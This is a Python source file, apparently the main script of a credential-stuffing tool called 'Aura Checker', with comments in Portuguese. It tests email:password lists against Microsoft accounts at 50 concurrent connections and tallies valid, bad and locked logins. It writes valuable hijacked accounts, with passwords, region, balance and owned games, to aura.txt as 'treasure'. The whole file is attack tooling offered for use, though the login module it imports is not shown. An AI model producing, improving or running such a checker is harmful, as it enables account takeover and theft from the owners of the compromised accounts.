import asyncio
import os
import sys
import time
from datetime import datetime
from .logic import MicrosoftChecker, AccountLoader
from .models import LoginStatus

# Configurações de Performance
CONCURRENCY = 50 

class Colors:
    CYAN = "\033[38;5;51m"
    GREEN = "\033[38;5;82m"
    YELLOW = "\033[38;5;226m"
    RED = "\033[38;5;196m"
    MAGENTA = "\033[38;5;201m"
    BLUE = "\033[38;5;27m"
    WHITE = "\033[38;5;255m"
    GRAY = "\033[38;5;244m"
    RESET = "\033[0m"
    BOLD = "\033[1m"
    GOLD = "\033[38;5;214m"

class Stats:
    def __init__(self, total_accounts):
        self.total_to_check = total_accounts
        self.checked = 0
        self.aura = 0      
        self.hits = 0      
        self.bad = 0       
        self.blocked = 0   
        self.error = 0     
        self.start_time = time.time()

    def update(self, status, is_aura=False):
        self.checked += 1
        if status == LoginStatus.LOGADO:
            if is_aura:
                self.aura += 1
            else:
                self.hits += 1
        elif status == LoginStatus.ERRO_CREDENCIAIS:
            self.bad += 1
        elif status == LoginStatus.SESSAO_BLOQUEADA:
            self.blocked += 1
        else:
            self.error += 1

    def get_speed(self):
        elapsed = time.time() - self.start_time
        return self.checked / elapsed if elapsed > 0 else 0

def print_header():
    os.system('cls' if os.name == 'nt' else 'clear')
    w = 115
    print(f"{Colors.CYAN}╔{'═'*(w-2)}╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}{'A U R A   C H E C K E R':^{w-2}}{Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╠{'═'*(w-2)}╣{Colors.RESET}")
    print(f"{Colors.CYAN}║ {Colors.BOLD}{Colors.WHITE}{'LOG DE ATIVIDADE':<45} {Colors.CYAN}║ {Colors.BOLD}{Colors.GOLD}{'DETALHES DO TESOURO (AURA)':<63} {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚{'═'*47}╩{'═'*65}╝{Colors.RESET}")

async def process(checker, account, semaphore, stats, aura_file):
    async with semaphore:
        result = await checker.check_account(account)
        
        is_aura = False
        if result.status == LoginStatus.LOGADO:
            balance_str = str(result.balance).lower()
            if (balance_str != "n/a" and balance_str != "0.00" and "0.00" not in balance_str) or len(result.games) > 0:
                is_aura = True
        
        stats.update(result.status, is_aura)
        
        # Tags Estilizadas
        if result.status == LoginStatus.LOGADO:
            tag = f"{Colors.BOLD}{Colors.GOLD}● AURA{Colors.RESET}" if is_aura else f"{Colors.BOLD}{Colors.BLUE}○ HIT {Colors.RESET}"
        elif result.status == LoginStatus.ERRO_CREDENCIAIS:
            tag = f"{Colors.RED}✖ BAD {Colors.RESET}"
        elif result.status == LoginStatus.SESSAO_BLOQUEADA:
            tag = f"{Colors.YELLOW}🔒 LOCK{Colors.RESET}"
        else:
            tag = f"{Colors.MAGENTA}⚠ ERR {Colors.RESET}"

        left_side = f"{tag} {Colors.GRAY}{account.email[:38]:<38}{Colors.RESET}"

        if is_aura:
            # Layout de detalhes mais limpo e elegante
            details = (f"{Colors.BOLD}{Colors.WHITE}🌍 {result.region:<3} {Colors.GRAY}|{Colors.RESET} "
                       f"{Colors.GOLD}💰 {result.balance:<10} {Colors.GRAY}|{Colors.RESET} "
                       f"{Colors.GREEN}🎮 {len(result.games)} Jogos{Colors.RESET}")
            
            sys.stdout.write(f"\033[K {left_side} {Colors.CYAN}│{Colors.RESET} {details}\n")
            
            aura_file.write(f"{result.email}:{result.password} | Região: {result.region} | Saldo: {result.balance} | Jogos: {', '.join(result.games)}\n")
            aura_file.flush()
        else:
            sys.stdout.write(f"\033[K {left_side} {Colors.CYAN}│{Colors.RESET}\n")

        # Barra de status moderna no rodapé
        speed = stats.get_speed()
        status_line = (f"{Colors.CYAN} ❯❯ {Colors.BOLD}{Colors.WHITE}Progresso: {stats.checked}/{stats.total_to_check}{Colors.RESET} {Colors.GRAY}|{Colors.RESET} "
                       f"{Colors.GOLD}Aura: {stats.aura}{Colors.RESET} {Colors.GRAY}|{Colors.RESET} "
                       f"{Colors.BLUE}Hits: {stats.hits}{Colors.RESET} {Colors.GRAY}|{Colors.RESET} "
                       f"{Colors.RED}Bad: {stats.bad}{Colors.RESET} {Colors.GRAY}|{Colors.RESET} "
                       f"{Colors.YELLOW}Lock: {stats.blocked}{Colors.RESET} {Colors.GRAY}|{Colors.RESET} "
                       f"{Colors.WHITE}Speed: {speed:.2f} acc/s{Colors.RESET}")
        
        sys.stdout.write(f"\033[s\033[999;1H\033[K{status_line}\033[u")
        sys.stdout.flush()

async def main():
    os.chdir(os.path.dirname(os.path.abspath(sys.argv[0])) if getattr(sys.modules['__main__'], '__file__', None) else os.getcwd())

    acc_file = "accounts.txt"
    if not os.path.exists(acc_file):
        with open(acc_file, "w") as f: f.write("exemplo@outlook.com:senha123\n")
        return

    accounts = AccountLoader.load(acc_file)
    if not accounts:
        print(f"{Colors.RED}[!] Nenhuma conta encontrada.{Colors.RESET}")
        return

    print_header()
    f_aura = open("aura.txt", "a", encoding="utf-8")
    
    checker = MicrosoftChecker(max_connections=CONCURRENCY + 10)
    semaphore = asyncio.Semaphore(CONCURRENCY)
    stats = Stats(len(accounts))

    tasks = [process(checker, acc, semaphore, stats, f_aura) for acc in accounts]
    
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        pass
    finally:
        await checker.close()
        f_aura.close()

    # Quadro de Resumo Final Estilizado
    w = 60
    print(f"\n\n{Colors.CYAN}╔{'═'*(w-2)}╗{Colors.RESET}")
    print(f"{Colors.CYAN}║{Colors.BOLD}{Colors.WHITE}{'R E S U M O   D A   S E S S Ã O':^{w-2}}{Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╠{'═'*(w-2)}╣{Colors.RESET}")
    print(f"{Colors.CYAN}║ {Colors.GOLD}● AURA (Tesouro):{stats.aura:>{w-20}} {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║ {Colors.BLUE}○ HITS (Normais):{stats.hits:>{w-20}} {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║ {Colors.RED}✖ BAD (Incorretas):{stats.bad:>{w-22}} {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║ {Colors.YELLOW}🔒 LOCK (Bloqueios):{stats.blocked:>{w-22}} {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}║ {Colors.MAGENTA}⚠ ERR (Erros):{stats.error:>{w-17}} {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╠{'═'*(w-2)}╣{Colors.RESET}")
    print(f"{Colors.CYAN}║ {Colors.BOLD}{Colors.WHITE}TOTAL VERIFICADO:{stats.checked:>{w-20}} {Colors.CYAN}║{Colors.RESET}")
    print(f"{Colors.CYAN}╚{'═'*(w-2)}╝{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{Colors.WHITE}[?] Deseja limpar o arquivo 'accounts.txt'?{Colors.RESET}")
    choice = input(f" {Colors.CYAN}❯{Colors.RESET} Digite 's' para sim ou Enter para manter: ").lower().strip()
    if choice == 's':
        with open(acc_file, "w") as f: f.write("")
        print(f"{Colors.GREEN}✔ Arquivo limpo.{Colors.RESET}")
    
    print(f"\n{Colors.GRAY}Sessão finalizada. Tesouro em aura.txt{Colors.RESET}")

if __name__ == "__main__":
    if sys.platform == 'win32':
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    asyncio.run(main())
